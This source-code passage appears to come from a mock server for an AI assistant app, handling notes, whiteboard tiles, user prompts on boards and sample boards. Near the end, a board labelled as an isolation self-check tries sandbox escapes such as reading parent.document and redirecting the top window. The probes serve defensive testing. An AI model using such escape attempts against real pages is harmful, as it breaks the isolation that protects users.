    if (sid && !state.sessions.has(sid)) throw notFound(`Session not found: ${sid}`);
    n = { id: `note_${hex(6)}`, title, content, version: 1, created_at: t, updated_at: t, ...(sid ? { session_id: sid } : {}), by_user: !!by_user, agent_edit: !by_user, ...(!by_user && sid ? { edit_session: rootSession(sid) } : {}), all_bots: true, keep_from_agents: false };
  }
  state.notes.set(n.id, n);
  broadcast({ type: 'note_updated', note: noteInfo(n) });
  return n;
}
function deleteNote(id) {
  if (!state.notes.delete(id)) return;
  state.noteVersions.delete(id);
  const layout = clone(state.mosaics);
  let changed = false;
  for (const m of layout.mosaics) {
    const before = m.tiles.length;
    m.tiles = m.tiles.filter((t) => t.note_id !== id);
    changed ||= m.tiles.length !== before;
  }
  if (changed) setMosaics({ ...layout, version: state.mosaics.version + 1 });
  broadcast({ type: 'note_removed', id });
}
/** `note` with `show: true`: a note tile beside the chat's tile (like ensureBoardTile). */
function ensureNoteTile(root, noteId) {
  const layout = clone(state.mosaics);
  if (layout.mosaics.some((m) => m.tiles.some((t) => t.note_id === noteId))) return;
  const tile = { id: `tile_${hex(6)}`, note_id: noteId };
  const at = layout.mosaics.map((m) => m.tiles.findIndex((t) => t.session_id === root));
  const mi = at.findIndex((i) => i >= 0);
  if (mi >= 0) layout.mosaics[mi].tiles.splice(at[mi] + 1, 0, tile);
  else if (layout.mosaics.length) layout.mosaics[0].tiles.push(tile);
  else layout.mosaics.push({ id: `mos_${hex(4)}`, name: 'Main', layout: 'dwindle', tiles: [{ id: `tile_${hex(6)}`, session_id: root }, tile] });
  layout.version = state.mosaics.version + 1;
  setMosaics(layout);
}
/** "write a note about …": the agent writes a note with the `note` tool and shows it beside the chat. */
async function scenarioNote(t, text, rec) {
  const topic = oneLine(text.replace(/^.*?\bnotes?\b\s*(about|on|for)?\s*/i, ''), 60) || 'This chat';
  const title = topic[0].toUpperCase() + topic.slice(1);
  const content = md`
## ${title}

- What we decided, in one line each
- **Open:** what still needs an answer
- Next step: keep this note up to date as we go
`;
  let note = null;
  // AGENT-TILES: the note is a card in the chat; its tile opens only when asked ("show me", "open it").
  const show = /\b(show|open)\b/i.test(text);
  await t.step({
    thinking: show ? 'Keep this in a note the user can edit, and show it beside the chat as asked.' : 'Keep this in a note the user can edit.',
    text: show ? "I'll keep that in a note next to our chat." : "I'll keep that in a note.",
    calls: [{
      name: 'note', args: { action: 'create', title, content, ...(show ? { show: true } : {}) },
      exec: {
        duration: 300,
        run: async () => {
          note = saveNote({ title, content, session_id: rec.info.id, by_user: false });
          if (show) ensureNoteTile(rootSession(rec.info.id), note.id);
          return { text: `Created note ${note.id} "${note.title}" (version 1).${show ? ' It is open beside this chat.' : ''}`, details: { note: { id: note.id, title: note.title, version: note.version, action: 'create' } } };
        },
      },
    }],
  });
  await t.step({ thinking: 'Point at it.', text: show ? 'The note is in the tile beside this chat. Edit it there any time; I can read it back later.' : 'The note is saved: open it from the card above. I can read it back later.' });
}
/** Ask the devices for a picture of a board on screen (engine board look): the first image within ~10 s wins. */
function requestSnapshot(boardId, ms = 10_000) {
  const request_id = `snap_${hex(6)}`;
  return new Promise((resolve) => {
    let errors = [];
    const done = (v) => {
      clearTimeout(timer);
      state.snapshotWaits.delete(request_id);
      resolve(v);
    };
    const timer = setTimeout(() => done({ image: null, error: errors[0] ?? 'no device showed it' }), ms);
    state.snapshotWaits.set(request_id, (a) => {
      if (a.image) done(a);
      else if (a.error) errors.push(a.error);
    });
    broadcast({ type: 'board_snapshot_request', request_id, board_id: boardId });
  });
}
/** "look at the board": `whiteboard` with `action: "look"` on the chat's latest board. */
async function scenarioLook(t, text, rec) {
  const board = [...state.boards.values()].filter((b) => rootSession(b.session_id) === rootSession(rec.info.id)).sort((a, b) => b.updated_at - a.updated_at)[0];
  if (!board) {
    await t.step({ thinking: 'Nothing is shown beside this chat.', text: "There's nothing on a whiteboard beside this chat for me to look at yet." });
    return;
  }
  let seen = null;
  await t.step({
    thinking: 'Look at what the user sees on that board.',
    text: `Let me look at “${board.title}”.`,
    calls: [{
      name: 'whiteboard', args: { action: 'look', id: board.id },
      exec: {
        duration: 200,
        run: async (turn, _call, rt) => {
          // A web view is the server's own browser tab: its picture is right here (no device needed).
          if (board.content.type === 'url' || board.content.type === 'local') {
            const pic = renderTab(browserTab(board.id));
            seen = { image: { mime: pic.mime, data: pic.data, width: pic.width, height: pic.height } };
          } else {
            turn.toolOutput(rt, 'Asking a device that shows it for a picture…\n');
            seen = await requestSnapshot(board.id);
          }
          return seen.image
            ? { text: `Looked at whiteboard ${board.id} ("${board.title}"): a ${seen.image.width}×${seen.image.height} picture of what the user sees.`, details: { board: { id: board.id }, snapshot: { width: seen.image.width, height: seen.image.height } } }
            : { text: `Couldn't look at it (${seen.error}); read its content instead.`, details: { board: { id: board.id }, fallback: 'read' } };
        },
      },
    }],
  });
  await t.step({ thinking: 'Say what was seen.', text: seen?.image ? `I can see it: “${board.title}”, ${seen.image.width}×${seen.image.height}. Tell me what you'd like to change.` : `I couldn't see it on any of your devices, so I read what it contains instead.` });
}

// ─── memory review (engine review): an internal helper, never listed ────────
/** After a turn whose message said "remember", review the chat like the engine does and post what was learned. */
function startMemoryReview(parent, text) {
  if (parent.info.private || parent.info.kind !== 'chat') return;
  const model = resolveRole('memory') ?? resolveRole('utility') ?? parent.info.model; // engine memory_model()
  const rec = createSession({ kind: 'subagent', title: 'Memory review', cwd: parent.info.cwd, model, permission: 'auto', parent_id: parent.info.id, status: 'running',
    ...(parent.info.bot_id ? { bot_id: parent.info.bot_id } : {}) });
  rec.info.internal = true;
  emitSession(rec);
  later(3500, () => {
    if (!state.sessions.has(rec.info.id)) return;
    addEntry(rec, { kind: 'assistant', content: [{ type: 'text', text: 'Saved one note.' }], model: rec.info.model, usage: zeroUsage(), stop: 'stop' });
    setStatus(rec, 'idle');
    if (!state.sessions.has(parent.info.id)) return;
    const fact = oneLine(text.replace(/^.*?\bremember\b[:,]?\s*(that\s+)?/i, ''), 120) || 'What you asked to remember';
    addEntry(parent, LEARNED([{ kind: 'profile', action: 'added', text: fact[0].toUpperCase() + fact.slice(1) }]));
    emitSession(parent);
  });
}

// ─── whiteboards (engine/boards.rs, tools/board.rs, proto::board) ──────────
/** tessera_proto::board::CSP: no network at all. */
const BOARD_CSP = "default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; media-src 'self' data: blob:; connect-src 'none'; worker-src blob:; frame-src 'none'; form-action 'none'; base-uri 'none'";
// The header also sandboxes the page wherever it opens (not allowed in its <meta>).
const BOARD_CSP_HEADER = `${BOARD_CSP}; sandbox allow-scripts`;
const BOARD_LIB_DIR = fileURLToPath(new URL('../../../../assets/board-lib/', import.meta.url));
const BOARD_LIBS = new Set(['three.module.js', 'three-addons/controls/OrbitControls.js', 'three-addons/controls/TrackballControls.js',
  'three-addons/renderers/CSS2DRenderer.js', 'three-addons/renderers/CSS3DRenderer.js', 'd3.js']);
// The "web app the agent is building" (a `local` board); PORT+100 keeps clear of mocks run side by side.
const LOCAL_APP_PORT = Number(process.env.LOCAL_APP_PORT) || PORT + 100;
const MAX_BOARDS = 50;

/** proto::board::document: the policy first, an import map for `three`, the app's colours. */
function boardDocument(html, dark) {
  const [bg, fg, muted, accent, surface] = dark ? ['#141312', '#ece6dc', '#9b948a', '#d4ad5e', '#1d1b19'] : ['#f6f2ea', '#211e1a', '#6f685f', '#9a7431', '#ece6da'];
  const head = `<meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${BOARD_CSP}"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="referrer" content="no-referrer"><script type="importmap">{"imports":{"three":"/board-lib/three.module.js","three/addons/":"/board-lib/three-addons/"}}</script><style>:root{color-scheme:${dark ? 'dark' : 'light'};--tessera-bg:${bg};--tessera-fg:${fg};--tessera-muted:${muted};--tessera-accent:${accent};--tessera-surface:${surface}}html,body{margin:0;background:var(--tessera-bg);color:var(--tessera-fg);font:15px/1.5 system-ui,sans-serif}</style>`;
  const lower = html.toLowerCase();
  let i = lower.indexOf('<head>');
  if (i >= 0) return html.slice(0, i + 6) + head + html.slice(i + 6);
  i = lower.indexOf('<html');
  if (i >= 0) {
    const at = i + lower.slice(i).indexOf('>') + 1;
    return `${html.slice(0, at)}<head>${head}</head>${html.slice(at)}`;
  }
  return `<!doctype html><html><head>${head}</head><body>${html}</body></html>`;
}

const boardKind = (c) => c.type;
const defaultBoardTitle = (c) => ({ html: 'Whiteboard', markdown: 'Notes', image: 'Image', url: 'Web page', local: 'Web app' })[c.type] ?? 'Whiteboard';
/** The chat a board sits beside: subagents show theirs next to their parent. */
function rootSession(id) {
  for (let i = 0; i < 8; i++) {
    const info = state.sessions.get(id)?.info;
    if (info?.kind === 'subagent' && info.parent_id) id = info.parent_id;
    else break;
  }
  return id;
}
function checkBoardContent(c) {
  if (!c || typeof c !== 'object') throw badRequest('content must be one of html, markdown, image, url, local');
  switch (c.type) {
    case 'html':
      if (!String(c.html ?? '').trim()) throw badRequest('the page must not be empty');
      return { type: 'html', html: String(c.html) };
    case 'markdown':
      if (!String(c.markdown ?? '').trim()) throw badRequest('markdown must not be empty');
      return { type: 'markdown', markdown: String(c.markdown) };
    case 'image':
      if (!['image/png', 'image/jpeg', 'image/gif', 'image/webp', 'image/svg+xml'].includes(String(c.mime))) throw badRequest('images must be PNG, JPEG, GIF, WebP or SVG');
      return { type: 'image', mime: String(c.mime), data: String(c.data).replace(/^data:[^,]*,/, '').replace(/\s+/g, '') };
    case 'url': {
      let u;
      try { u = new URL(String(c.url).trim()); } catch { throw badRequest(`\`${c.url}\` isn't a URL`); }
      if (!['http:', 'https:'].includes(u.protocol) || !u.hostname) throw badRequest('only http(s) addresses can be shown');
      return { type: 'url', url: u.toString() };
    }
    case 'local': {
      const port = Number(c.port);
      const p = String(c.path || '/').trim() || '/';
      if (!Number.isInteger(port) || port <= 0 || port > 65535 || port === PORT) throw badRequest('choose the port your web app listens on');
      if (!p.startsWith('/') || p.includes('://')) throw badRequest('`local_path` must start with /');
      return { type: 'local', port, path: p };
    }
    default:
      throw badRequest(`unknown board content \`${c.type}\``);
  }
}
/** Create or update a board (engine show_board) and make sure it has a tile. */
function showBoard(sessionId, { id, title, content, byUser = false }, place) {
  const rec = state.sessions.get(sessionId);
  if (!rec) throw notFound(`Session not found: ${sessionId}`);
  if (rec.info.private) throw badRequest("whiteboards aren't available in private chats");
  content = checkBoardContent(content);
  const t = now();
  let board;
  if (id) {
    const b = state.boards.get(id);
    if (!b || rootSession(b.session_id) !== rootSession(sessionId)) throw notFound(`no whiteboard \`${id}\` in this conversation`);
    board = { ...b, content, title: title ? oneLine(title, 80) : b.title, version: b.version + 1, updated_at: t };
  } else {
    if ([...state.boards.values()].filter((b) => b.session_id === sessionId).length >= MAX_BOARDS) throw badRequest('this chat has too many whiteboards; update or delete one');
    board = { id: `wb_${hex(7)}`, session_id: sessionId, title: (title && oneLine(title, 80)) || defaultBoardTitle(content), content, version: 1, created_at: t, updated_at: t, by_user: byUser };
  }
  state.boards.set(board.id, board);
  broadcast({ type: 'board_updated', board });
  if (place !== 'none') ensureBoardTile(rootSession(sessionId), board.id, place);
  return board;
}
/** engine ensure_board_tile: after the chat's tile, else the end of the first mosaic, else a new "Main" mosaic. */
function ensureBoardTile(root, boardId, place) {
  const layout = clone(state.mosaics);
  if (layout.mosaics.some((m) => m.tiles.some((t) => t.board_id === boardId))) return;
  const tile = { id: `tile_${hex(6)}`, board_id: boardId };
  let placed = false;
  // place 'first' plays a server that couldn't find the chat's tile (it was still only on the device).
  for (const m of place === 'first' ? [] : layout.mosaics) {
    const i = m.tiles.findIndex((t) => t.session_id === root);
    if (i >= 0) {
      if (m.tiles.length >= 48) return;
      m.tiles.splice(i + 1, 0, tile);
      placed = true;
      break;
    }
  }
  if (!placed) {
    if (layout.mosaics.length) {
      if (layout.mosaics[0].tiles.length >= 48) return;
      layout.mosaics[0].tiles.push(tile);
    } else {
      layout.mosaics.push({ id: `mos_${hex(4)}`, name: 'Main', layout: 'dwindle', tiles: [{ id: `tile_${hex(6)}`, session_id: root }, tile] });
    }
  }
  layout.version = state.mosaics.version + 1;
  setMosaics(layout);
}
function removeBoardTiles(boardId) {
  const layout = clone(state.mosaics);
  const before = layout.mosaics.reduce((n, m) => n + m.tiles.length, 0);
  for (const m of layout.mosaics) m.tiles = m.tiles.filter((t) => t.board_id !== boardId);
  if (layout.mosaics.reduce((n, m) => n + m.tiles.length, 0) === before) return;
  layout.version = state.mosaics.version + 1;
  setMosaics(layout);
}
function deleteBoard(id) {
  const b = state.boards.get(id);
  if (!b) return;
  if (b.ask) state.boardAsks.get(b.ask.id)?.resolve({ type: 'cancel' });
  state.boardAsks.delete(b.ask?.id);
  state.boards.delete(id);
  state.boardTokens.delete(id);
  if (BROWSER?.tabs) {
    BROWSER.tabs.delete(id);
    for (const t of BROWSER.tabs.values()) if (t.tab_ids?.includes(id)) { t.tab_ids=t.tab_ids.filter((s)=>s!==id);tabChanged(t); }
  }
  removeBoardTiles(id);
  broadcast({ type: 'board_removed', id, session_id: b.session_id });
}
/**
 * Ask on a board (engine ask_board): a new "Your input" markdown board unless `id` is given. Resolves with
 * the AskAnswer; `cancel` (a Turn) stops it. The session shows `awaiting_approval` while it waits.
 */
async function askBoard(sessionId, { id, title, prompt, input, content }, turn) {
  prompt = String(prompt ?? '').trim();
  if (!prompt || prompt.length > 2000) throw badRequest('the question must be 1–2000 characters');
  if (input.type === 'choice' && (!input.options?.length || input.options.length > 12)) throw badRequest('give 1–12 short options');
  // AGENT-TILES: a plain question shows in the chat only; a board it is about goes on screen.
  let board = id ? state.boards.get(id) : showBoard(sessionId, { title: title ?? 'Your input', content: content ?? { type: 'markdown', markdown: prompt } }, 'none');
  if (!board) throw notFound(`no whiteboard \`${id}\``);
  if (board.ask) throw badRequest('that whiteboard is already waiting for an answer');
  const askId = `ask_${hex(6)}`;
  board = { ...board, ask: { id: askId, prompt, input }, version: board.version + 1, updated_at: now() };
  state.boards.set(board.id, board);
  broadcast({ type: 'board_updated', board });
  if (id) ensureBoardTile(rootSession(sessionId), board.id);
  const rec = state.sessions.get(sessionId);
  const was = rec?.info.status ?? 'idle';
  if (rec) setStatus(rec, 'awaiting_approval');
  let answer;
  try {
    answer = await (turn
      ? turn.wait((done) => { state.boardAsks.set(askId, { boardId: board.id, input, resolve: done }); return () => state.boardAsks.delete(askId); })
      : new Promise((resolve) => state.boardAsks.set(askId, { boardId: board.id, input, resolve })));
  } finally {
    state.boardAsks.delete(askId);
    // Back to work (a stopped turn has already gone idle).
    if (rec && state.sessions.has(sessionId) && !turn?.cancelled) setStatus(rec, turn ? 'running' : was === 'awaiting_approval' ? 'idle' : was);
    const cur = state.boards.get(board.id);
    if (cur?.ask?.id === askId) {
      const { ask: _drop, ...rest } = cur;
      const next = { ...rest, version: cur.version + 1, updated_at: now() };
      state.boards.set(next.id, next);
      broadcast({ type: 'board_updated', board: next });
    }
  }
  return answer;
}
function answerFits(input, a) {
  if (a?.type === 'cancel') return true;
  switch (input.type) {
    case 'signature': {
      if (a?.type !== 'signature' || typeof a.png !== 'string') return false;
      const bytes = Buffer.from(a.png.trim(), 'base64');
      return bytes.length > 8 && bytes.length <= 2 << 20 && bytes.subarray(0, 8).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]));
    }
    case 'text': return a?.type === 'text' && typeof a.text === 'string' && a.text.length <= 20000;
    case 'choice':
      if (input.multi && a?.type === 'choices') {
        const ix = a.indexes;
        return Array.isArray(ix) && ix.length > 0 && ix.every((i) => Number.isInteger(i) && i >= 0 && i < input.options.length) && new Set(ix).size === ix.length;
      }
      return a?.type === 'choice' && Number.isInteger(a.index) && a.index >= 0 && a.index < input.options.length;
    case 'confirm': return a?.type === 'confirm' && typeof a.yes === 'boolean';
    default: return false;
  }
}
/** What the `whiteboard` tool reports back to the model for an answer (tools/board.rs). */
function answerText(input, a, sessionId) {
  switch (a.type) {
    case 'cancel': return 'The user declined to answer.';
    case 'text': return `The user answered:\n${a.text}`;
    case 'choice': return `The user chose: ${input.options?.[a.index] ?? '?'}`;
    case 'choices': return `The user chose: ${a.indexes.map((i) => input.options?.[i] ?? '?').join(', ')}`;
    case 'confirm': return a.yes ? 'The user said yes.' : 'The user said no.';
    case 'signature': {
      const p = `${UPLOAD_DIR}/${sessionId}/signature-${now()}.png`;
      state.signatures.push({ session_id: sessionId, path: p, bytes: Buffer.from(a.png, 'base64').length });
      return `The user signed. Their signature is saved as ${p} (PNG with a transparent background). Use it only for what you asked it for.`;
    }
  }
  return 'The user answered.';
}

// ── sample boards ─────────────────────────────────────────────────────────
const crcTable = (() => { const t = new Uint32Array(256); for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; t[n] = c >>> 0; } return t; })();
function crc32(buf) { let c = 0xffffffff; for (const b of buf) c = crcTable[(c ^ b) & 0xff] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; }
function pngChunk(type, data) {
  const len = Buffer.alloc(4); len.writeUInt32BE(data.length);
  const td = Buffer.concat([Buffer.from(type, 'ascii'), data]);
  const crc = Buffer.alloc(4); crc.writeUInt32BE(crc32(td));
  return Buffer.concat([len, td, crc]);
}
/** A small mosaic picture (PNG, base64), drawn here so the mock needs no image files. */
function mosaicPng(w = 720, h = 440, seed = 7) {
  const rnd = mulberry32(seed);
  const pal = [[212, 175, 95], [125, 155, 224], [95, 179, 158], [224, 122, 86], [176, 122, 156], [236, 230, 220], [60, 55, 49]];
  const cell = 20;
  const cols = Math.ceil(w / cell), rows = Math.ceil(h / cell);
  const colors = [];
  for (let r = 0; r < rows; r++) for (let c = 0; c < cols; c++) {
    // A sun over waves: gold near the centre-top, lapis waves below, stone elsewhere.
    const cx = c - cols / 2, cy = r - rows * 0.38;
    const d = Math.hypot(cx, cy * 1.2);
    const wave = r > rows * 0.62 && Math.sin(c * 0.55 + r * 0.9) > -0.2;
    let idx = d < 5 ? 0 : d < 6.2 ? 3 : wave ? (r % 2 ? 1 : 2) : r > rows * 0.62 ? 1 : 6;
    if (idx === 6 && rnd() < 0.08) idx = 5;
    const jit = (rnd() - 0.5) * 26;
    colors.push(pal[idx].map((v) => Math.max(0, Math.min(255, Math.round(v + jit)))));
  }
  const raw = Buffer.alloc((w * 3 + 1) * h);
  for (let y = 0; y < h; y++) {
    raw[y * (w * 3 + 1)] = 0;
    for (let x = 0; x < w; x++) {
      const grout = x % cell < 2 || y % cell < 2;
      const col = grout ? [24, 22, 20] : colors[Math.floor(y / cell) * cols + Math.floor(x / cell)];
      const o = y * (w * 3 + 1) + 1 + x * 3;
      raw[o] = col[0]; raw[o + 1] = col[1]; raw[o + 2] = col[2];
    }
  }
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 2; ihdr[10] = 0; ihdr[11] = 0; ihdr[12] = 0;
  const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), pngChunk('IHDR', ihdr), pngChunk('IDAT', zlib.deflateSync(raw)), pngChunk('IEND', Buffer.alloc(0))]);
  return png.toString('base64');
}

const TOPOLOGY_HTML = md`
<!doctype html><html><head><title>Home network</title><style>
html,body{height:100%;overflow:hidden}
canvas{display:block}
.label{font:600 12px system-ui,sans-serif;color:var(--tessera-fg);padding:3px 8px;border-radius:3px;background:color-mix(in srgb,var(--tessera-surface) 88%,transparent);box-shadow:0 0 0 1px color-mix(in srgb,var(--tessera-fg) 14%,transparent);white-space:nowrap;pointer-events:none}
.label small{display:block;font-weight:400;color:var(--tessera-muted);font-size:10.5px}
#hud{position:fixed;left:14px;top:12px;font:12px system-ui,sans-serif;color:var(--tessera-muted);line-height:1.5}
#hud b{color:var(--tessera-fg);font-size:14px;display:block}
</style></head><body>
<div id="hud"><b>Your home network</b>Packets flow from the internet through the router. Drag to orbit, scroll to zoom.</div>
<script type="module">
import * as THREE from 'three';
import { OrbitControls } from 'three/addons/controls/OrbitControls.js';
import { CSS2DRenderer, CSS2DObject } from 'three/addons/renderers/CSS2DRenderer.js';
const css = getComputedStyle(document.documentElement);
const v = (n) => css.getPropertyValue(n).trim();
const scene = new THREE.Scene();
scene.background = new THREE.Color(v('--tessera-bg'));
const camera = new THREE.PerspectiveCamera(45, innerWidth / innerHeight, 0.1, 200);
camera.position.set(9, 8, 13);
const renderer = new THREE.WebGLRenderer({ antialias: true });
renderer.setPixelRatio(Math.min(devicePixelRatio, 2));
renderer.setSize(innerWidth, innerHeight);
document.body.appendChild(renderer.domElement);
const labels = new CSS2DRenderer();
labels.setSize(innerWidth, innerHeight);
labels.domElement.style.cssText = 'position:fixed;inset:0;pointer-events:none';
document.body.appendChild(labels.domElement);
const controls = new OrbitControls(camera, renderer.domElement);
controls.enableDamping = true;
controls.autoRotate = true;
controls.autoRotateSpeed = 0.6;
scene.add(new THREE.HemisphereLight(0xffffff, 0x333333, 1.4));
const sun = new THREE.DirectionalLight(0xffffff, 1.6); sun.position.set(5, 10, 7); scene.add(sun);
const accent = new THREE.Color(v('--tessera-accent'));
const nodes = {
  internet: { p: [0, 3.2, -6], c: '#7d9be0', label: 'Internet', sub: 'ISP · 1 Gbit/s' },
  router:   { p: [0, 1.4, -2], c: v('--tessera-accent'), label: 'Router', sub: '192.168.1.1 · firewall, DHCP' },
  switch:   { p: [0, 0.6, 1.5], c: '#5fb39e', label: 'Switch', sub: '8 ports' },
  ap:       { p: [-4.2, 1.2, 0], c: '#5fb39e', label: 'Wi-Fi access point', sub: '2.4 + 5 GHz' },
  nas:      { p: [3.8, 0.2, 3.2], c: '#b07a9c', label: 'NAS', sub: 'Tessera server' },
  desktop:  { p: [-1.6, 0, 4.4], c: '#e07a56', label: 'Desktop', sub: 'wired' },
  tv:       { p: [1.8, 0, 4.8], c: '#e07a56', label: 'TV', sub: 'wired' },
  laptop:   { p: [-6.4, 0, 2.6], c: '#ece6dc', label: 'Laptop', sub: 'Wi-Fi' },
  phone:    { p: [-5.2, 0, 4.6], c: '#ece6dc', label: 'Phone', sub: 'Wi-Fi' },
};
const edges = [['internet','router'],['router','switch'],['router','ap'],['switch','nas'],['switch','desktop'],['switch','tv'],['ap','laptop'],['ap','phone']];
for (const [k, n] of Object.entries(nodes)) {
  const geo = k === 'internet' ? new THREE.IcosahedronGeometry(0.9, 1) : new THREE.BoxGeometry(1.1, 0.5 + (k === 'router' ? 0.3 : 0), 0.8);
  const mat = new THREE.MeshStandardMaterial({ color: n.c, roughness: 0.55, metalness: 0.1, flatShading: true });
  const m = new THREE.Mesh(geo, mat);
  m.position.set(...n.p);
  scene.add(m);
  n.mesh = m;
  const div = document.createElement('div');
  div.className = 'label';
  div.innerHTML = n.label + '<small>' + n.sub + '</small>';
  const l = new CSS2DObject(div);
  l.position.set(0, 0.9, 0);
  m.add(l);
}
const grid = new THREE.GridHelper(30, 30, 0x555555, 0x333333);
grid.material.opacity = 0.25; grid.material.transparent = true; grid.position.y = -0.4;
scene.add(grid);
const packets = [];
for (const [a, b] of edges) {
  const pa = new THREE.Vector3(...nodes[a].p), pb = new THREE.Vector3(...nodes[b].p);
  const curve = new THREE.QuadraticBezierCurve3(pa, pa.clone().lerp(pb, 0.5).add(new THREE.Vector3(0, 0.8, 0)), pb);
  const line = new THREE.Mesh(new THREE.TubeGeometry(curve, 32, 0.035, 6), new THREE.MeshBasicMaterial({ color: accent, transparent: true, opacity: 0.55 }));
  scene.add(line);
  for (let i = 0; i < 2; i++) {
    const dot = new THREE.Mesh(new THREE.SphereGeometry(0.09, 12, 12), new THREE.MeshBasicMaterial({ color: accent }));
    scene.add(dot);
    packets.push({ dot, curve, t: Math.random(), speed: 0.12 + Math.random() * 0.1 });
  }
}
addEventListener('resize', () => {
  camera.aspect = innerWidth / innerHeight; camera.updateProjectionMatrix();
  renderer.setSize(innerWidth, innerHeight); labels.setSize(innerWidth, innerHeight);
});
let last = performance.now();
renderer.setAnimationLoop((now) => {
  const dt = Math.min(0.05, (now - last) / 1000); last = now;
  for (const p of packets) { p.t = (p.t + dt * p.speed) % 1; p.dot.position.copy(p.curve.getPoint(p.t)); }
  nodes.internet.mesh.rotation.y += dt * 0.4;
  controls.update();
  renderer.render(scene, camera);
  labels.render(scene, camera);
});
</script></body></html>`;

const CHART_HTML = md`
<!doctype html><html><head><title>Latency</title><style>
html,body{height:100%}
body{display:flex;flex-direction:column;padding:18px 22px;box-sizing:border-box}
h1{font:600 16px system-ui,sans-serif;margin:0}
p{margin:2px 0 10px;color:var(--tessera-muted);font-size:13px}
#chart{flex:1;min-height:0}
.axis text{fill:var(--tessera-muted);font:11px system-ui,sans-serif}
.axis path,.axis line{stroke:color-mix(in srgb,var(--tessera-fg) 20%,transparent)}
.legend{display:flex;gap:16px;font-size:12px;color:var(--tessera-muted)}
.legend i{display:inline-block;width:10px;height:10px;border-radius:2px;margin-right:6px;vertical-align:-1px}
</style><script src="/board-lib/d3.js"></script></head><body>
<h1>Reconnect latency, before and after the fix</h1>
<p>p95 time from a dropped socket to a resynced session, per day (ms).</p>
<div class="legend"><span><i style="background:#e07a56"></i>Before</span><span><i style="background:var(--tessera-accent)"></i>After</span></div>
<svg id="chart"></svg>
<script>
const days = ['Mon','Tue','Wed','Thu','Fri','Sat','Sun'];
const before = [820, 910, 760, 1040, 880, 700, 950];
const after = [140, 160, 120, 180, 150, 110, 130];
const accent = getComputedStyle(document.documentElement).getPropertyValue('--tessera-accent').trim();
function draw() {
  const svg = d3.select('#chart');
  svg.selectAll('*').remove();
  const { width, height } = svg.node().getBoundingClientRect();
  const m = { t: 16, r: 10, b: 28, l: 44 };
  const x = d3.scaleBand().domain(days).range([m.l, width - m.r]).padding(0.28);
  const y = d3.scaleLinear().domain([0, 1100]).nice().range([height - m.b, m.t]);
  svg.append('g').attr('class', 'axis').attr('transform', 'translate(0,' + (height - m.b) + ')').call(d3.axisBottom(x).tickSizeOuter(0));
  svg.append('g').attr('class', 'axis').attr('transform', 'translate(' + m.l + ',0)').call(d3.axisLeft(y).ticks(5));
  const g = svg.append('g');
  const bw = x.bandwidth() / 2;
  const bars = (data, color, dx, delay) => g.selectAll(null).data(data).join('rect')
    .attr('x', (_, i) => x(days[i]) + dx).attr('width', bw - 2).attr('rx', 2)
    .attr('y', y(0)).attr('height', 0).attr('fill', color)
    .transition().delay((_, i) => delay + i * 60).duration(700).ease(d3.easeCubicOut)
    .attr('y', (d) => y(d)).attr('height', (d) => y(0) - y(d));
  bars(before, '#e07a56', 0, 0);
  bars(after, accent, bw, 300);
}
draw();
addEventListener('resize', draw);
</script></body></html>`;

const MARKDOWN_BOARD = md`
# How a reconnect resyncs

When the socket drops, the client **never guesses** what it missed. It asks.

1. The client reconnects with backoff: 0.4 s, 0.8 s, 1.6 s … capped at 30 s.
2. For every open session it sends \`get_session { since_seq }\`.
3. The server answers with the missed entries, the live stream and pending approvals.

| Step | Who | Cost |
|---|---|---|
| Probe endpoints | client | one \`/api/health\` per endpoint |
| Resync | server | one indexed range scan per session |
| Replace stream | client | cheap: the snapshot wins |

> A snapshot is always correct to apply, so there is nothing to reconcile.

~~~rust
let snap = api.get_session(id, Some(last_seq)).await?;
store.apply(snap); // entries, streaming, approvals, queue
~~~
`;

const APPLICATION_HTML = md`
<!doctype html><html><head><title>Application</title><style>
body{padding:28px 32px;max-width:720px;margin:0 auto}
.doc{background:var(--tessera-surface);border-radius:6px;padding:28px 32px;box-shadow:0 0 0 1px color-mix(in srgb,var(--tessera-fg) 10%,transparent)}
h1{font:600 20px system-ui,sans-serif;margin:0 0 4px}
.muted{color:var(--tessera-muted);font-size:13px}
dl{display:grid;grid-template-columns:140px 1fr;gap:6px 16px;margin:22px 0;font-size:14px}
dt{color:var(--tessera-muted)}
dd{margin:0}
.sig{margin-top:28px;border-top:1px dashed color-mix(in srgb,var(--tessera-fg) 30%,transparent);padding-top:8px;font-size:12px;color:var(--tessera-muted)}
</style></head><body><div class="doc">
<h1>Application: Senior Platform Engineer</h1>
<div class="muted">ACME Corp · submitted through their careers portal</div>
<dl>
<dt>Name</dt><dd>Alex Rivera</dd>
<dt>Email</dt><dd>alex@example.com</dd>
<dt>Start date</dt><dd>1 November 2026</dd>
<dt>Attachments</dt><dd>CV (2 pages), cover letter</dd>
<dt>Declaration</dt><dd>I confirm the information above is accurate and complete.</dd>
</dl>
<div class="sig">Signature</div>
</div></body></html>`;

/** Boards that try to escape: every attempt must fail (see the UI's security test). */
const EVIL_HTML = md`
<!doctype html><html><head><title>Escape attempts</title><style>
body{padding:16px 20px;font:13px/1.5 ui-monospace,monospace}
h1{font:600 15px system-ui,sans-serif;margin:0 0 10px}
li.blocked{color:#5fb39e} li.open{color:#e8714c;font-weight:700}
</style></head><body><h1>Board isolation self-check</h1><ol id="out"></ol>
<script>
const out = document.getElementById('out');
const results = {};
function note(name, fn) {
  let verdict, detail;
  try { const r = fn(); verdict = r === 'blocked' ? 'blocked' : 'open'; detail = r; }
  catch (e) { verdict = 'blocked'; detail = e.name + ': ' + String(e.message).slice(0, 80); }
  results[name] = verdict;
  const li = document.createElement('li'); li.className = verdict; li.textContent = name + ' → ' + verdict + ' (' + detail + ')'; out.appendChild(li);
}
note('parent.document', () => { const d = parent.document; return d ? 'read ' + d.title : 'blocked'; });
note('top.location = …', () => { top.location = 'https://example.com/nav-check'; return 'navigated?'; });
